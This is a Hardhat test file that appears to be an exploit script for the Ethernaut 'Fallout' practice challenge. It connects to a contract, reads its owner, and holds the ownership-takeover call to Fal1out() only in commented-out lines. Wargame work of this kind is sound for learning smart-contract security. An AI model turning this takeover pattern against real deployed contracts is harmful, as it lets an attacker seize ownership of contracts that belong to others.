const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fal1out Exploit using EOA", function () {
  let falloutContract, attacker, contractAddress, newOwner;
  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639"; // insert contract address of ethernaut challenge
    falloutContract = await ethers.getContractAt(
      "Fallout",
      contractAddress,
      attacker
    );

    console.log("grabbing fallout contract", falloutContract);
  });

  it("perform exploit", async function () {
    // Attack flow

    // Grabs the original owner of the contract
    let txGetOwner = await falloutContract.owner();

    // let receiptGetOwner = await txGetOwner.wait();

    console.log("The original owner is ", txGetOwner);
    // // Call allocate
    // let txFal1out = await falloutContract.Fal1out();

    // let reciept = await txFal1out.wait();

    // console.log("TXALLOCATE ->", txFal1out);
    // console.log("RECEIPT ALLOCATE -> ", reciept);

    // // call the fal1out function with a message value
    // // let txCallFal1out = await falloutContract.Fal1out({
    // //   value: ethers.utils.parseEther("0"),
    // // });

    // // await txCallFal1out.wait();

    // let txGetNewOwner = await falloutContract.owner();
    // // call the fal1out function with a message value

    // // await txGetNewOwner.wait();

    // newOwner = txGetNewOwner;

    // console.log("The original owner is ", txGetOwner);
  });

  after("confirm exploit", async function () {
    // expect(newOwner).to.be.eq(attacker.address);
  });
});
